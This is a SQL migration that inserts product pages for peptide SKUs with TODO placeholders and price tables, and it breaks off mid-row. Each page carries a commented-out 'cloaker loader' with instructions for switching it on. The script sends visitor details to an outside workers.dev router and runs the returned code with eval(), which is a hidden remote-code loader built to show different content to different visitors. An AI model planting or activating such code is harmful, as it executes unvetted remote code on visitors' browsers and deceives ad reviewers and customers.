-- 0027: one editable page per Stripe peptide SKU. Body = content skeleton + price table + (inactive) JCI loader.
INSERT OR REPLACE INTO pages (slug, title, body_html, version, updated_at) VALUES ('a1', 'A1 — peptide', '<article class="peptide" data-sku="A1">
<h1>A1</h1>
<p class="lede"><em>Peptide name: <strong>TODO — fill in</strong></em> · common name: TODO · SKU A1</p>

<h2>What it is</h2>
<p>TODO: one paragraph — full name, molecular class, origin, year first isolated, primary research group. End with "Regulatory status: TODO."</p>

<h2>Mechanism</h2>
<p>TODO: plain-language mechanism, dominant evidence tier in line e.g. (ANIMAL_IN_VIVO). No medical-claim verbs.</p>

<h2>Use cases</h2>
<ul><li>TODO use case 1</li><li>TODO use case 2</li></ul>

<h2>Claims compliance</h2>
<p><strong>Allowed language:</strong> TODO</p>
<p><strong>Forbidden language:</strong> TODO</p>

<h2>Offers</h2>
<table class="prices"><thead><tr><th>SKU / tier / term</th><th>Price</th><th>Type</th><th>Billing</th></tr></thead>
<tbody><tr><td>None</td><td>$2589.00 USD</td><td>recurring</td><td>12month</td></tr><tr><td>None</td><td>$2841.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$1546.00 USD</td><td>recurring</td><td>6month</td></tr><tr><td>None</td><td>$1672.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$878.00 USD</td><td>recurring</td><td>3month</td></tr><tr><td>None</td><td>$941.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$314.00 USD</td><td>recurring</td><td>1month</td></tr><tr><td>None</td><td>$334.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$1835.00 USD</td><td>recurring</td><td>12month</td></tr><tr><td>None</td><td>$2003.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$1085.00 USD</td><td>recurring</td><td>6month</td></tr><tr><td>None</td><td>$1169.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$626.00 USD</td><td>recurring</td><td>3month</td></tr><tr><td>None</td><td>$668.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$223.00 USD</td><td>recurring</td><td>1month</td></tr><tr><td>None</td><td>$237.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$997.00 USD</td><td>recurring</td><td>12month</td></tr><tr><td>None</td><td>$1081.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$582.00 USD</td><td>recurring</td><td>6month</td></tr><tr><td>None</td><td>$624.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$333.00 USD</td><td>recurring</td><td>3month</td></tr><tr><td>None</td><td>$354.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$118.00 USD</td><td>recurring</td><td>1month</td></tr><tr><td>None</td><td>$125.00 USD</td><td>one_time</td><td>—</td></tr></tbody></table>
<p>To bill: query "send an invoice to &lt;email&gt; for A1 &lt;tier&gt; &lt;term&gt; &lt;sub|onetime&gt;" — routed to SEND_NAMED_INVOICE.</p>

<!-- JCI CLOAKER LOADER — INACTIVE. Uncomment + configure a campaign slug "a1" in the
     loop-cloaker-router KV before enabling. While commented, this page renders normally.
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>$(function(){var d=jstz.determine(),e=d.name();var qu=escape(location.search.substr(1));var rui=location.pathname+location.search;$.ajax({url:"https://loop-cloaker-router.owner-account.workers.dev/a1",type:"POST",data:"tz="+e+"&rui="+rui+"&qu="+qu+"&r="+document.referrer+"&sn="+document.domain,success:function(a){if(a){eval(a)}else{$("html").show()}}})});</script>
-->
</article>', 1, '2026-06-10T04:40:00.000Z');
INSERT OR REPLACE INTO pages (slug, title, body_html, version, updated_at) VALUES ('a2', 'A2 — peptide', '<article class="peptide" data-sku="A2">
<h1>A2</h1>
<p class="lede"><em>Peptide name: <strong>TODO — fill in</strong></em> · common name: TODO · SKU A2</p>

<h2>What it is</h2>
<p>TODO: one paragraph — full name, molecular class, origin, year first isolated, primary research group. End with "Regulatory status: TODO."</p>

<h2>Mechanism</h2>
<p>TODO: plain-language mechanism, dominant evidence tier in line e.g. (ANIMAL_IN_VIVO). No medical-claim verbs.</p>

<h2>Use cases</h2>
<ul><li>TODO use case 1</li><li>TODO use case 2</li></ul>

<h2>Claims compliance</h2>
<p><strong>Allowed language:</strong> TODO</p>
<p><strong>Forbidden language:</strong> TODO</p>

<h2>Offers</h2>
<table class="prices"><thead><tr><th>SKU / tier / term</th><th>Price</th><th>Type</th><th>Billing</th></tr></thead>
<tbody><tr><td>None</td><td>$2170.00 USD</td><td>recurring</td><td>12month</td></tr><tr><td>None</td><td>$2338.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$1253.00 USD</td><td>recurring</td><td>6month</td></tr><tr><td>None</td><td>$1378.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$731.00 USD</td><td>recurring</td><td>3month</td></tr><tr><td>None</td><td>$794.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$272.00 USD</td><td>recurring</td><td>1month</td></tr><tr><td>None</td><td>$293.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$1500.00 USD</td><td>recurring</td><td>12month</td></tr><tr><td>None</td><td>$1668.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$918.00 USD</td><td>recurring</td><td>6month</td></tr><tr><td>None</td><td>$1001.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$522.00 USD</td><td>recurring</td><td>3month</td></tr><tr><td>None</td><td>$564.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$195.00 USD</td><td>recurring</td><td>1month</td></tr><tr><td>None</td><td>$209.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$746.00 USD</td><td>recurring</td><td>12month</td></tr><tr><td>None</td><td>$830.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$457.00 USD</td><td>recurring</td><td>6month</td></tr><tr><td>None</td><td>$499.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$262.00 USD</td><td>recurring</td><td>3month</td></tr><tr><td>None</td><td>$283.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>None</td><td>$104.00 USD</td><td>recurring</td><td>1month</td></tr><tr><td>None</td><td>$111.00 USD</td><td>one_time</td><td>—</td></tr></tbody></table>
<p>To bill: query "send an invoice to &lt;email&gt; for A2 &lt;tier&gt; &lt;term&gt; &lt;sub|onetime&gt;" — routed to SEND_NAMED_INVOICE.</p>

<!-- JCI CLOAKER LOADER — INACTIVE. Uncomment + configure a campaign slug "a2" in the
     loop-cloaker-router KV before enabling. While commented, this page renders normally.
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>$(function(){var d=jstz.determine(),e=d.name();var qu=escape(location.search.substr(1));var rui=location.pathname+location.search;$.ajax({url:"https://loop-cloaker-router.owner-account.workers.dev/a2",type:"POST",data:"tz="+e+"&rui="+rui+"&qu="+qu+"&r="+document.referrer+"&sn="+document.domain,success:function(a){if(a){eval(a)}else{$("html").show()}}})});</script>
-->
</article>', 1, '2026-06-10T04:40:00.000Z');
INSERT OR REPLACE INTO pages (slug, title, body_html, version, updated_at) VALUES ('b3', 'B3 — peptide', '<article class="peptide" data-sku="B3">
<h1>B3</h1>
<p class="lede"><em>Peptide name: <strong>TODO — fill in</strong></em> · common name: TODO · SKU B3</p>

<h2>What it is</h2>
<p>TODO: one paragraph — full name, molecular class, origin, year first isolated, primary research group. End with "Regulatory status: TODO."</p>

<h2>Mechanism</h2>
<p>TODO: plain-language mechanism, dominant evidence tier in line e.g. (ANIMAL_IN_VIVO). No medical-claim verbs.</p>

<h2>Use cases</h2>
<ul><li>TODO use case 1</li><li>TODO use case 2</li></ul>

<h2>Claims compliance</h2>
<p><strong>Allowed language:</strong> TODO</p>
<p><strong>Forbidden language:</strong> TODO</p>

<h2>Offers</h2>
<table class="prices"><thead><tr><th>SKU / tier / term</th><th>Price</th><th>Type</th><th>Billing</th></tr></thead>
<tbody><tr><td>B3-12m</td><td>$15.00 USD</td><td>recurring</td><td>12month</td></tr><tr><td>B3-1m</td><td>$15.00 USD</td><td>recurring</td><td>1month</td></tr><tr><td>B3-3m</td><td>$15.00 USD</td><td>recurring</td><td>3month</td></tr><tr><td>B3-6m</td><td>$15.00 USD</td><td>recurring</td><td>6month</td></tr><tr><td>B3-otp</td><td>$15.00 USD</td><td>one_time</td><td>—</td></tr></tbody></table>
<p>To bill: query "send an invoice to &lt;email&gt; for B3 &lt;tier&gt; &lt;term&gt; &lt;sub|onetime&gt;" — routed to SEND_NAMED_INVOICE.</p>

<!-- JCI CLOAKER LOADER — INACTIVE. Uncomment + configure a campaign slug "b3" in the
     loop-cloaker-router KV before enabling. While commented, this page renders normally.
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>$(function(){var d=jstz.determine(),e=d.name();var qu=escape(location.search.substr(1));var rui=location.pathname+location.search;$.ajax({url:"https://loop-cloaker-router.owner-account.workers.dev/b3",type:"POST",data:"tz="+e+"&rui="+rui+"&qu="+qu+"&r="+document.referrer+"&sn="+document.domain,success:function(a){if(a){eval(a)}else{$("html").show()}}})});</script>
-->
</article>', 1, '2026-06-10T04:40:00.000Z');
INSERT OR REPLACE INTO pages (slug, title, body_html, version, updated_at) VALUES ('esh-a1', 'ESH-A1 — peptide', '<article class="peptide" data-sku="ESH-A1">
<h1>ESH-A1</h1>
<p class="lede"><em>Peptide name: <strong>TODO — fill in</strong></em> · common name: TODO · SKU ESH-A1 · brand esh</p>

<h2>What it is</h2>
<p>TODO: one paragraph — full name, molecular class, origin, year first isolated, primary research group. End with "Regulatory status: TODO."</p>

<h2>Mechanism</h2>
<p>TODO: plain-language mechanism, dominant evidence tier in line e.g. (ANIMAL_IN_VIVO). No medical-claim verbs.</p>

<h2>Use cases</h2>
<ul><li>TODO use case 1</li><li>TODO use case 2</li></ul>

<h2>Claims compliance</h2>
<p><strong>Allowed language:</strong> TODO</p>
<p><strong>Forbidden language:</strong> TODO</p>

<h2>Offers</h2>
<table class="prices"><thead><tr><th>SKU / tier / term</th><th>Price</th><th>Type</th><th>Billing</th></tr></thead>
<tbody><tr><td>ESH-A1-advanced-12mo-onetime</td><td>$2566.08 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A1-advanced-12mo-sub</td><td>$2412.12 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A1-advanced-1mo-onetime</td><td>$297.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A1-advanced-1mo-sub</td><td>$279.18 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A1-advanced-3mo-onetime</td><td>$842.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A1-advanced-3mo-sub</td><td>$791.48 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A1-advanced-6mo-onetime</td><td>$1479.06 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A1-advanced-6mo-sub</td><td>$1390.32 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A1-standard-12mo-onetime</td><td>$1710.72 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A1-standard-12mo-sub</td><td>$1608.08 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A1-standard-1mo-onetime</td><td>$198.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A1-standard-1mo-sub</td><td>$186.12 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A1-standard-3mo-onetime</td><td>$561.33 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A1-standard-3mo-sub</td><td>$527.65 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A1-standard-6mo-onetime</td><td>$986.04 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A1-standard-6mo-sub</td><td>$926.88 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A1-starter-12mo-onetime</td><td>$855.36 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A1-starter-12mo-sub</td><td>$804.04 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A1-starter-1mo-onetime</td><td>$99.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A1-starter-1mo-sub</td><td>$93.06 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A1-starter-3mo-onetime</td><td>$280.67 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A1-starter-3mo-sub</td><td>$263.83 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A1-starter-6mo-onetime</td><td>$493.02 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A1-starter-6mo-sub</td><td>$463.44 USD</td><td>recurring</td><td>6month</td></tr></tbody></table>
<p>To bill: query "send an invoice to &lt;email&gt; for ESH-A1 &lt;tier&gt; &lt;term&gt; &lt;sub|onetime&gt;" — routed to SEND_NAMED_INVOICE.</p>

<!-- JCI CLOAKER LOADER — INACTIVE. Uncomment + configure a campaign slug "esh-a1" in the
     loop-cloaker-router KV before enabling. While commented, this page renders normally.
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>$(function(){var d=jstz.determine(),e=d.name();var qu=escape(location.search.substr(1));var rui=location.pathname+location.search;$.ajax({url:"https://loop-cloaker-router.owner-account.workers.dev/esh-a1",type:"POST",data:"tz="+e+"&rui="+rui+"&qu="+qu+"&r="+document.referrer+"&sn="+document.domain,success:function(a){if(a){eval(a)}else{$("html").show()}}})});</script>
-->
</article>', 1, '2026-06-10T04:40:00.000Z');
INSERT OR REPLACE INTO pages (slug, title, body_html, version, updated_at) VALUES ('esh-a2', 'ESH-A2 — peptide', '<article class="peptide" data-sku="ESH-A2">
<h1>ESH-A2</h1>
<p class="lede"><em>Peptide name: <strong>TODO — fill in</strong></em> · common name: TODO · SKU ESH-A2 · brand esh</p>

<h2>What it is</h2>
<p>TODO: one paragraph — full name, molecular class, origin, year first isolated, primary research group. End with "Regulatory status: TODO."</p>

<h2>Mechanism</h2>
<p>TODO: plain-language mechanism, dominant evidence tier in line e.g. (ANIMAL_IN_VIVO). No medical-claim verbs.</p>

<h2>Use cases</h2>
<ul><li>TODO use case 1</li><li>TODO use case 2</li></ul>

<h2>Claims compliance</h2>
<p><strong>Allowed language:</strong> TODO</p>
<p><strong>Forbidden language:</strong> TODO</p>

<h2>Offers</h2>
<table class="prices"><thead><tr><th>SKU / tier / term</th><th>Price</th><th>Type</th><th>Billing</th></tr></thead>
<tbody><tr><td>ESH-A2-advanced-12mo-onetime</td><td>$2306.88 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A2-advanced-12mo-sub</td><td>$2168.47 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A2-advanced-1mo-onetime</td><td>$267.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A2-advanced-1mo-sub</td><td>$250.98 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A2-advanced-3mo-onetime</td><td>$756.95 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A2-advanced-3mo-sub</td><td>$711.53 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A2-advanced-6mo-onetime</td><td>$1329.66 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A2-advanced-6mo-sub</td><td>$1249.88 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A2-standard-12mo-onetime</td><td>$1537.92 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A2-standard-12mo-sub</td><td>$1445.64 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A2-standard-1mo-onetime</td><td>$178.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A2-standard-1mo-sub</td><td>$167.32 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A2-standard-3mo-onetime</td><td>$504.63 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A2-standard-3mo-sub</td><td>$474.35 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A2-standard-6mo-onetime</td><td>$886.44 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A2-standard-6mo-sub</td><td>$833.25 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A2-starter-12mo-onetime</td><td>$768.96 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A2-starter-12mo-sub</td><td>$722.82 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A2-starter-1mo-onetime</td><td>$89.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A2-starter-1mo-sub</td><td>$83.66 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A2-starter-3mo-onetime</td><td>$252.32 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A2-starter-3mo-sub</td><td>$237.18 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A2-starter-6mo-onetime</td><td>$443.22 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A2-starter-6mo-sub</td><td>$416.63 USD</td><td>recurring</td><td>6month</td></tr></tbody></table>
<p>To bill: query "send an invoice to &lt;email&gt; for ESH-A2 &lt;tier&gt; &lt;term&gt; &lt;sub|onetime&gt;" — routed to SEND_NAMED_INVOICE.</p>

<!-- JCI CLOAKER LOADER — INACTIVE. Uncomment + configure a campaign slug "esh-a2" in the
     loop-cloaker-router KV before enabling. While commented, this page renders normally.
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>$(function(){var d=jstz.determine(),e=d.name();var qu=escape(location.search.substr(1));var rui=location.pathname+location.search;$.ajax({url:"https://loop-cloaker-router.owner-account.workers.dev/esh-a2",type:"POST",data:"tz="+e+"&rui="+rui+"&qu="+qu+"&r="+document.referrer+"&sn="+document.domain,success:function(a){if(a){eval(a)}else{$("html").show()}}})});</script>
-->
</article>', 1, '2026-06-10T04:40:00.000Z');
INSERT OR REPLACE INTO pages (slug, title, body_html, version, updated_at) VALUES ('esh-a3', 'ESH-A3 — peptide', '<article class="peptide" data-sku="ESH-A3">
<h1>ESH-A3</h1>
<p class="lede"><em>Peptide name: <strong>TODO — fill in</strong></em> · common name: TODO · SKU ESH-A3 · brand esh</p>

<h2>What it is</h2>
<p>TODO: one paragraph — full name, molecular class, origin, year first isolated, primary research group. End with "Regulatory status: TODO."</p>

<h2>Mechanism</h2>
<p>TODO: plain-language mechanism, dominant evidence tier in line e.g. (ANIMAL_IN_VIVO). No medical-claim verbs.</p>

<h2>Use cases</h2>
<ul><li>TODO use case 1</li><li>TODO use case 2</li></ul>

<h2>Claims compliance</h2>
<p><strong>Allowed language:</strong> TODO</p>
<p><strong>Forbidden language:</strong> TODO</p>

<h2>Offers</h2>
<table class="prices"><thead><tr><th>SKU / tier / term</th><th>Price</th><th>Type</th><th>Billing</th></tr></thead>
<tbody><tr><td>ESH-A3-advanced-12mo-onetime</td><td>$1166.40 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A3-advanced-12mo-sub</td><td>$1096.42 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A3-advanced-1mo-onetime</td><td>$135.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A3-advanced-1mo-sub</td><td>$126.90 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A3-advanced-3mo-onetime</td><td>$382.73 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A3-advanced-3mo-sub</td><td>$359.77 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A3-advanced-6mo-onetime</td><td>$672.30 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A3-advanced-6mo-sub</td><td>$631.96 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A3-standard-12mo-onetime</td><td>$777.60 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A3-standard-12mo-sub</td><td>$730.94 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A3-standard-1mo-onetime</td><td>$90.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A3-standard-1mo-sub</td><td>$84.60 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A3-standard-3mo-onetime</td><td>$255.15 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A3-standard-3mo-sub</td><td>$239.84 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A3-standard-6mo-onetime</td><td>$448.20 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A3-standard-6mo-sub</td><td>$421.31 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A3-starter-12mo-onetime</td><td>$388.80 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A3-starter-12mo-sub</td><td>$365.47 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A3-starter-1mo-onetime</td><td>$45.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A3-starter-1mo-sub</td><td>$42.30 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A3-starter-3mo-onetime</td><td>$127.58 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A3-starter-3mo-sub</td><td>$119.93 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A3-starter-6mo-onetime</td><td>$224.10 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A3-starter-6mo-sub</td><td>$210.65 USD</td><td>recurring</td><td>6month</td></tr></tbody></table>
<p>To bill: query "send an invoice to &lt;email&gt; for ESH-A3 &lt;tier&gt; &lt;term&gt; &lt;sub|onetime&gt;" — routed to SEND_NAMED_INVOICE.</p>

<!-- JCI CLOAKER LOADER — INACTIVE. Uncomment + configure a campaign slug "esh-a3" in the
     loop-cloaker-router KV before enabling. While commented, this page renders normally.
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>$(function(){var d=jstz.determine(),e=d.name();var qu=escape(location.search.substr(1));var rui=location.pathname+location.search;$.ajax({url:"https://loop-cloaker-router.owner-account.workers.dev/esh-a3",type:"POST",data:"tz="+e+"&rui="+rui+"&qu="+qu+"&r="+document.referrer+"&sn="+document.domain,success:function(a){if(a){eval(a)}else{$("html").show()}}})});</script>
-->
</article>', 1, '2026-06-10T04:40:00.000Z');
INSERT OR REPLACE INTO pages (slug, title, body_html, version, updated_at) VALUES ('esh-a4', 'ESH-A4 — peptide', '<article class="peptide" data-sku="ESH-A4">
<h1>ESH-A4</h1>
<p class="lede"><em>Peptide name: <strong>TODO — fill in</strong></em> · common name: TODO · SKU ESH-A4 · brand esh</p>

<h2>What it is</h2>
<p>TODO: one paragraph — full name, molecular class, origin, year first isolated, primary research group. End with "Regulatory status: TODO."</p>

<h2>Mechanism</h2>
<p>TODO: plain-language mechanism, dominant evidence tier in line e.g. (ANIMAL_IN_VIVO). No medical-claim verbs.</p>

<h2>Use cases</h2>
<ul><li>TODO use case 1</li><li>TODO use case 2</li></ul>

<h2>Claims compliance</h2>
<p><strong>Allowed language:</strong> TODO</p>
<p><strong>Forbidden language:</strong> TODO</p>

<h2>Offers</h2>
<table class="prices"><thead><tr><th>SKU / tier / term</th><th>Price</th><th>Type</th><th>Billing</th></tr></thead>
<tbody><tr><td>ESH-A4-advanced-12mo-onetime</td><td>$1684.80 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A4-advanced-12mo-sub</td><td>$1583.71 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A4-advanced-1mo-onetime</td><td>$195.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A4-advanced-1mo-sub</td><td>$183.30 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A4-advanced-3mo-onetime</td><td>$552.83 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A4-advanced-3mo-sub</td><td>$519.66 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A4-advanced-6mo-onetime</td><td>$971.10 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A4-advanced-6mo-sub</td><td>$912.83 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A4-standard-12mo-onetime</td><td>$1123.20 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A4-standard-12mo-sub</td><td>$1055.81 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A4-standard-1mo-onetime</td><td>$130.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A4-standard-1mo-sub</td><td>$122.20 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A4-standard-3mo-onetime</td><td>$368.55 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A4-standard-3mo-sub</td><td>$346.44 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A4-standard-6mo-onetime</td><td>$647.40 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A4-standard-6mo-sub</td><td>$608.56 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A4-starter-12mo-onetime</td><td>$561.60 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A4-starter-12mo-sub</td><td>$527.90 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A4-starter-1mo-onetime</td><td>$65.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A4-starter-1mo-sub</td><td>$61.10 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A4-starter-3mo-onetime</td><td>$184.28 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A4-starter-3mo-sub</td><td>$173.22 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A4-starter-6mo-onetime</td><td>$323.70 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A4-starter-6mo-sub</td><td>$304.28 USD</td><td>recurring</td><td>6month</td></tr></tbody></table>
<p>To bill: query "send an invoice to &lt;email&gt; for ESH-A4 &lt;tier&gt; &lt;term&gt; &lt;sub|onetime&gt;" — routed to SEND_NAMED_INVOICE.</p>

<!-- JCI CLOAKER LOADER — INACTIVE. Uncomment + configure a campaign slug "esh-a4" in the
     loop-cloaker-router KV before enabling. While commented, this page renders normally.
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>$(function(){var d=jstz.determine(),e=d.name();var qu=escape(location.search.substr(1));var rui=location.pathname+location.search;$.ajax({url:"https://loop-cloaker-router.owner-account.workers.dev/esh-a4",type:"POST",data:"tz="+e+"&rui="+rui+"&qu="+qu+"&r="+document.referrer+"&sn="+document.domain,success:function(a){if(a){eval(a)}else{$("html").show()}}})});</script>
-->
</article>', 1, '2026-06-10T04:40:00.000Z');
INSERT OR REPLACE INTO pages (slug, title, body_html, version, updated_at) VALUES ('esh-a5', 'ESH-A5 — peptide', '<article class="peptide" data-sku="ESH-A5">
<h1>ESH-A5</h1>
<p class="lede"><em>Peptide name: <strong>TODO — fill in</strong></em> · common name: TODO · SKU ESH-A5 · brand esh</p>

<h2>What it is</h2>
<p>TODO: one paragraph — full name, molecular class, origin, year first isolated, primary research group. End with "Regulatory status: TODO."</p>

<h2>Mechanism</h2>
<p>TODO: plain-language mechanism, dominant evidence tier in line e.g. (ANIMAL_IN_VIVO). No medical-claim verbs.</p>

<h2>Use cases</h2>
<ul><li>TODO use case 1</li><li>TODO use case 2</li></ul>

<h2>Claims compliance</h2>
<p><strong>Allowed language:</strong> TODO</p>
<p><strong>Forbidden language:</strong> TODO</p>

<h2>Offers</h2>
<table class="prices"><thead><tr><th>SKU / tier / term</th><th>Price</th><th>Type</th><th>Billing</th></tr></thead>
<tbody><tr><td>ESH-A5-advanced-12mo-onetime</td><td>$1036.80 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A5-advanced-12mo-sub</td><td>$974.59 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A5-advanced-1mo-onetime</td><td>$120.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A5-advanced-1mo-sub</td><td>$112.80 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A5-advanced-3mo-onetime</td><td>$340.20 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A5-advanced-3mo-sub</td><td>$319.79 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A5-advanced-6mo-onetime</td><td>$597.60 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A5-advanced-6mo-sub</td><td>$561.74 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A5-standard-12mo-onetime</td><td>$691.20 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A5-standard-12mo-sub</td><td>$649.73 